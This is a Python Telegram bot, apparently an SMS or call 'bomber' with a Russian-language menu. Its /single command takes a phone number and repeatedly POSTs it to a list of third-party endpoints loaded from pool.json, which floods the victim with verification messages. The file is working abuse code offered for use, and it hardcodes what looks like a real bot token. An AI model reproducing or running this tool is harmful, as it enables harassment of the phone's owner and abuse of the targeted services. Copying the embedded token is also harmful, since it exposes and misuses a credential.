import json
import threading
import time
import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

TOKEN = "8993557899:AAFCg3iQDoeO9NMbKnBcMVk6W50HC5C4CWA"
ADMIN_ID = 8141670312

def load_pool():
    try:
        with open("pool.json", "r") as f:
            return json.load(f)
    except:
        return []

def fire(ep, phone):
    raw = ep["body"].replace("{phone}", phone)
    hdrs = {"User-Agent": "Mozilla/5.0"}
    if ep.get("body_type") == "json":
        hdrs["Content-Type"] = "application/json"
    else:
        hdrs["Content-Type"] = "application/x-www-form-urlencoded"
    try:
        r = requests.post(ep["url"], data=raw.encode(), headers=hdrs, timeout=5)
        if 200 <= r.status_code < 300:
            return True
        return False
    except:
        return False

def run_engine(phone, rounds):
    pool = load_pool()
    sent = 0
    for _ in range(rounds):
        for ep in pool:
            if fire(ep, phone):
                sent += 1
            time.sleep(0.1)
    return sent

def get_menu():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🚀 Запустить", callback_data="menu_single")],
        [InlineKeyboardButton("🛑 СТОП", callback_data="menu_stop")]
    ])

async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    await update.message.reply_text("🎛 Меню:", reply_markup=get_menu())

async def cmd_single(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    if not ctx.args: return await update.message.reply_text("формат: /single <phone>")
    phone = ctx.args[0]
    await update.message.reply_text(f"🚀 Запускаю на {phone}...")
    def bg():
        sent = run_engine(phone, 5)
        import asyncio
        asyncio.run_coroutine_threadsafe(
            update.message.reply_text(f"✅ Готово! Отправлено: {sent}", reply_markup=get_menu()),
            ctx.application.loop
        )
    threading.Thread(target=bg, daemon=True).start()

async def handle_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if query.from_user.id != ADMIN_ID: return
    if query.data == "menu_single":
        await query.edit_message_text("Введи команду:\n`/single 79991234567`", parse_mode="Markdown")
    elif query.data == "menu_stop":
        await query.edit_message_text("🛑 Остановлен.")

def main():
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("single", cmd_single))
    app.add_handler(CallbackQueryHandler(handle_callback))
    app.run_polling()

if __name__ == "__main__":
    main()
